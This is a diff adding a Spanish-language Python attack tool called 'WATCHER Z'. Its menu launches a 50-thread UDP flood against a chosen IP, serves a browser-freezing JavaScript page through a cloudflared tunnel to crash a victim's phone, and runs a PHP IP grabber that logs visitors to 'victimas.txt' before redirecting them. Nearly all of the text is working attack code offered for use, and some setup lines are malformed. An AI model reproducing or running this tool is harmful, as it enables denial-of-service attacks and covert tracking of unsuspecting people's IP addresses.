@@ -1,0 +1,61 @@
+mkdir -p .shadow_z_sector/hydra_core
+cd .shadow_z_sector/hydra_core
+nano hydra_flood.py chmod +x hydra_flood.py python hydra_flood.py
+192.168.0.1
+import os
+import socket
+import random
+import threading
+
+def ataque_total(target, port, payload):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while True:
+        s.sendto(payload, (target, port))
+
+def menu():
+    os.system('clear')
+    print("=========================================")
+    print("   WATCHER Z - PROTOCOLO DE SATURACIÓN   ")
+    print("=========================================")
+    print("1. ATAQUE POR IP (50 HILOS)")
+    print("2. ATAQUE POR LINK (SATURAR CELULAR)")
+    print("3. VER IPs CAPTURADAS (REVISAR RADAR)")
+    print("4. ACTIVAR RADAR (IP GRABBER)")
+    print("5. SALIR")
+    
+    opc = input("\n[#] Selecciona: ")
+
+    if opc == '1':
+        target = input("IP Pública Objetivo: ")
+        port = 80
+        payload = random._urandom(4096)
+        print(f"\n[!!!] LANZANDO 50 HILOS CONTRA {target}...")
+        for i in range(50):
+            threading.Thread(target=ataque_total, args=(target, port, payload)).start()
+
+    elif opc == '2':
+        # Link de saturación para cualquier red
+        with open("index.html", "w") as f:
+            f.write("<html><body style='background:#000;color:red;'><script>function b(){while(true){window.history.pushState({},'','#'+Math.random());}}for(i=0;i<50;i++){setTimeout(b,10);}</script><center><h1>⚠️ ERROR DE RED ⚠️</h1></center></body></html>")
+        os.system("pkill php > /dev/null 2>&1")
+        os.system("php -S 0.0.0.0:8080 > /dev/null 2>&1 &")
+        os.system("cloudflared tunnel --url http://0.0.0.0:8080")
+
+    elif opc == '3':
+        print("\n[📡] REVISANDO RADAR...")
+        os.system("cat victimas.txt")
+        input("\nPresiona Enter para volver...")
+        menu()
+
+    elif opc == '4':
+        print("\n[!] ACTIVANDO RADAR (IP GRABBER)...")
+        with open("index.php", "w") as f:
+            f.write("<?php $ip = $_SERVER['REMOTE_ADDR']; $f = fopen('victimas.txt', 'a'); fwrite($f, 'IP: ' . $ip . ' | Fecha: ' . date('Y-m-d H:i:s') . '\\n'); fclose($f); header('Location: https://www.youtube.com/watch?v=kYv_u7_yWcI'); ?>")
+        os.system("pkill php > /dev/null 2>&1")
+        os.system("php -S 0.0.0.0:8080 > /dev/null 2>&1 &")
+        print("[+] Radar activo. Pasa el link de Cloudflare a tu objetivo.")
+        os.system("cloudflared tunnel --url http://0.0.0.0:8080")
+
+if __name__ == "__main__":
+    menu()
+python hydra_flood.py 80
